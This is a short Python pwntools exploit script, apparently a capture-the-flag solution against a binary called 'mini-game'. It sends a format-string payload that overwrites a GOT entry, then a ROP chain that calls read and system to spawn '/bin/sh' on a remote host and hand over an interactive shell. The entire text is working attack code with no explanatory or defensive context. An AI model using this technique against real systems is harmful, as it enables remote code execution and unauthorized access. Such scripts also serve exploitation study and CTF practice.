from pwn import *

system = 0x4007b6
got_system = 0x602030
pop_rdi_ret = 0x400e23
pop4 = 0x400e1c
pop_rsi_pop_ret = 0x400e21
read = 0x400800
write_memory = 0x602088

hero_name = "/bin/sh"
choice = "2"
share = "Y"


status1 = "%4197916x" + "%6$n\x00\x00\x00" + p64(got_system) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_pop_ret) + p64(write_memory) + p64(0) + p64(read) + p64(pop_rdi_ret) + p64(write_memory) + p64(system)

s = remote("103.237.99.35", 26122)
#s = process("./mini-game")
s.sendline(hero_name)
s.recv()
s.sendline(choice)
s.recv()
s.sendline(share)
print s.recv()
s.sendline(status1)
s.sendline("/bin/sh\x00")
#s.recv()
s.interactive()
s.close()
